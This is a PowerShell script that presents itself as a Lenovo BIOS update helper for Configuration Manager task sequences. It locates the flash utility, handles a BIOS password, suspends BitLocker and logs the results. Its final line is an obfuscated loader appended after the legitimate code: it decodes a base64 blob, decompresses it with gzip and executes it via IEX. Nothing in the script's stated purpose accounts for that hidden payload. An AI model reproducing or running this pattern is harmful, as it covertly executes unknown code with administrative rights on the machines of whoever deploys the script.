
[CmdletBinding(SupportsShouldProcess = $true)]
param (
	[parameter(Mandatory = $true, HelpMessage = "Specify the path containing the WinUPTP or Flash.cmd.")]
	[ValidateNotNullOrEmpty()]
	[string]$Path,
	[parameter(Mandatory = $false, HelpMessage = "Specify the BIOS password if necessary.")]
	[ValidateNotNullOrEmpty()]
	[string]$Password,
	[parameter(Mandatory = $false, HelpMessage = "Set the name of the log file produced by the flash utility.")]
	[ValidateNotNullOrEmpty()]
	[string]$LogFileName = "LenovoFlashBIOSUpdate.log"
)
Begin {
	
	try {
		$TSEnvironment = New-Object -ComObject Microsoft.SMS.TSEnvironment -ErrorAction Stop
	}
	catch [System.Exception] {
		Write-Warning -Message "Unable to construct Microsoft.SMS.TSEnvironment object"
	}
}
Process {
	
	function Write-CMLogEntry {
		param (
			[parameter(Mandatory = $true, HelpMessage = "Value added to the log file.")]
			[ValidateNotNullOrEmpty()]
			[string]$Value,
			[parameter(Mandatory = $true, HelpMessage = "Severity for the log entry. 1 for Informational, 2 for Warning and 3 for Error.")]
			[ValidateNotNullOrEmpty()]
			[ValidateSet("1", "2", "3")]
			[string]$Severity,
			[parameter(Mandatory = $false, HelpMessage = "Name of the log file that the entry will written to.")]
			[ValidateNotNullOrEmpty()]
			[string]$FileName = "Invoke-LenovoBIOSUpdate.log"
		)
		
		$LogFilePath = Join-Path -Path $Script:TSEnvironment.Value("_SMSTSLogPath") -ChildPath $FileName
		
		
		$Time = -join @((Get-Date -Format "HH:mm:ss.fff"), "+", (Get-WmiObject -Class Win32_TimeZone | Select-Object -ExpandProperty Bias))
		
		
		$Date = (Get-Date -Format "MM-dd-yyyy")
		
		
		$Context = $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
		
		
		$LogText = "<![LOG[$($Value)]LOG]!><time=""$($Time)"" date=""$($Date)"" component=""LenovoBIOSUpdate.log"" context=""$($Context)"" type=""$($Severity)"" thread=""$($PID)"" file="""">"
		
		
		try {
			Add-Content -Value $LogText -LiteralPath $LogFilePath -ErrorAction Stop
		}
		catch [System.Exception] {
			Write-Warning -Message "Unable to append log entry to Invoke-LenovoBIOSUpdate.log file. Error message: $($_.Exception.Message)"
		}
	}
	
	
    Set-Location -Path $Path

	
	Write-CMLogEntry -Value "Initiating script to determine flashing capabilities for Lenovo BIOS updates" -Severity 1
	
	
	if (([Environment]::Is64BitOperatingSystem) -eq $true) {
		$WinUPTPUtility = Get-ChildItem -Path $Path -Filter "*.exe" -Recurse | Where-Object { $_.Name -like "WinUPTP64.exe" } | Select-Object -ExpandProperty FullName
	}
	else {
		$WinUPTPUtility = Get-ChildItem -Path $Path -Filter "*.exe" -Recurse | Where-Object { $_.Name -like "WinUPTP.exe" } | Select-Object -ExpandProperty FullName
	}
	
	
	$FlashCMDUtility = Get-ChildItem -Path $Path -Filter "*.cmd" -Recurse | Where-Object { $_.Name -like "Flash.cmd" } | Select-Object -ExpandProperty FullName
	
	if ($WinUPTPUtility -ne $null) {
		
		Write-CMLogEntry -Value "Using WinUTPT BIOS update method" -Severity 1
		$FlashSwitches = " /S"
		$FlashUtility = $WinUPTPUtility
	}
	
	if ($FlashCMDUtility -ne $null) {
		
		Write-CMLogEntry -Value "Using FlashCMDUtility BIOS update method" -Severity 1
		$FlashSwitches = " /quiet /sccm /ign"
		$FlashUtility = $FlashCMDUtility
	}
	
	if (!$FlashUtility) {
		Write-CMLogEntry -Value "Supported upgrade utility was not found." -Severity 3
	}
	
	if ($Password -ne $null) {
		
		$FlashSwitches = $FlashSwitches + " /pass:$($Password)"
		Write-CMLogEntry -Value "Using the following switches for BIOS file: $($FlashSwitches -replace $Password, "<Password Removed>")" -Severity 1
	}
	
	
	$LogFilePath = Join-Path -Path $TSEnvironment.Value("_SMSTSLogPath") -ChildPath $LogFileName
	
	if (($TSEnvironment -ne $null) -and ($TSEnvironment.Value("_SMSTSinWinPE") -eq $true)) {
		try {
			
			$FlashProcess = Start-Process -FilePath $FlashUtility -ArgumentList $FlashSwitches -Passthru -Wait
			
			
			$FlashProcess.ExitCode | Out-File -FilePath $LogFilePath

            
            $WinUPTPLog = Get-ChildItem -Filter "*.log" -Recurse | Where-Object { $_.Name -like "winuptp.log" } -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
            Write-CMLogEntry -Value "winuptp.log file path is $($WinUPTPLog)" -Severity 1
            $SMSTSLogPath = Join-Path -Path $TSEnvironment.Value("_SMSTSLogPath") -ChildPath "winuptp.log"			
            Copy-Item -Path $WinUPTPLog -Destination $SMSTSLogPath -Force -ErrorAction SilentlyContinue
		}
		catch [System.Exception] {
			Write-CMLogEntry -Value "An error occured while updating the system BIOS in OS online phase. Error message: $($_.Exception.Message)" -Severity 3; exit 1
		}
	}
	else {
		
		
		
		$OSVolumeEncypted = if ((Manage-Bde -Status C:) -match "Protection On") { Write-Output $true } else { Write-Output $false }
		
		
		if ($OSVolumeEncypted -eq $true) {
			Write-CMLogEntry -Value "Suspending BitLocker protected volume: C:" -Severity 1
			Manage-Bde -Protectors -Disable C:
		}
		
		
		try {
			Write-CMLogEntry -Value "Running Flash Update - $($FlashUtility)" -Severity 1
			$FlashProcess = Start-Process -FilePath $FlashUtility -ArgumentList $FlashSwitches -Passthru -Wait
			
			
			$FlashProcess.ExitCode | Out-File -FilePath $LogFilePath
		}
		catch [System.Exception] {
			Write-Warning -Message "An error occured while updating the system bios. Error message: $($_.Exception.Message)"; exit 1
		}
	}
}
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();

